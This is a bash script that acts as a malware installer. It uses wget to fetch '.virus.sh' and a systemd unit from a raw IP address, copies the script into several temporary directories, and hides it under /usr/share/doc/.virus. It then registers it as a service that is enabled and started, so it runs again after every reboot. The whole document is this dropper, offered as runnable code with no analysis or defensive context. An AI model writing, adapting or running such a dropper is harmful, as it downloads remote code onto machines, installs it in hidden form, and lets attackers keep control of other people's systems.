#!/bin/bash
wget 51.250.22.147/.virus.sh
sudo chmod +x .virus.sh
wget 51.250.22.147/.virus.service
mkdir /usr/share/doc/.virus
d1=$(mktemp -d)/tmp1
d2=$(mktemp -d)/tmp2
d3=$(mktemp -d)/tmp3
d4=$(mktemp -d)/tmp4
mkdir $d
sudo cp .virus.sh $d1/
sudo cp .virus.sh $d2/
sudo cp .virus.sh $d3/
sudo cp .virus.sh $d4/
sudo mv .virus.sh /usr/share/doc/.virus/.virus.sh
sudo mv .virus.service /lib/systemd/system/virus.service
sudo systemctl enable virus.service && sudo systemctl start virus.service
